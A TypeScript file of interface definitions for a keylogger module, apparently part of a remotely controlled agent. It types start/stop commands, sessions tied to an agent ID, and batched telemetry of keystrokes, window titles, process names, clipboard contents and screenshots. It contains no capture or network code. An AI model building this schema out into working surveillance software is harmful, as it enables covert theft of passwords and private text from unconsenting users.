export type KeyloggerMode = "standard" | "offline";

export interface KeyloggerStartConfig {
  mode: KeyloggerMode;
  cadenceMs?: number;
  batchIntervalMs?: number;
  bufferSize?: number;
  includeWindowTitles?: boolean;
  includeClipboard?: boolean;
  emitProcessNames?: boolean;
  includeScreenshots?: boolean;
  encryptAtRest?: boolean;
  redactSecrets?: boolean;
}

export type KeyloggerAction = "start" | "stop" | "configure";

export interface KeyloggerCommandPayload {
  action: KeyloggerAction;
  sessionId?: string;
  mode?: KeyloggerMode;
  config?: KeyloggerStartConfig;
}

export interface KeyloggerKeystroke {
  sequence: number;
  capturedAt: string;
  key: string;
  text?: string;
  rawCode?: string;
  scanCode?: number;
  pressed?: boolean;
  altKey?: boolean;
  ctrlKey?: boolean;
  shiftKey?: boolean;
  metaKey?: boolean;
  windowTitle?: string;
  processName?: string;
  clipboard?: string;
}

export interface KeyloggerEventEnvelope {
  sessionId: string;
  mode: KeyloggerMode;
  capturedAt: string;
  events: KeyloggerKeystroke[];
  batchId?: string;
  totalEvents?: number;
}

export interface KeyloggerTelemetryBatch {
  batchId: string;
  capturedAt: string;
  events: KeyloggerKeystroke[];
  totalEvents: number;
}

export interface KeyloggerTelemetryState {
  batches: KeyloggerTelemetryBatch[];
  totalEvents: number;
  lastCapturedAt?: string;
}

export interface KeyloggerSessionState {
  sessionId: string;
  agentId: string;
  mode: KeyloggerMode;
  startedAt: string;
  active: boolean;
  config: KeyloggerStartConfig;
  totalEvents: number;
  lastCapturedAt?: string;
}

export interface KeyloggerSessionResponse {
  session: KeyloggerSessionState | null;
  telemetry: KeyloggerTelemetryState;
}

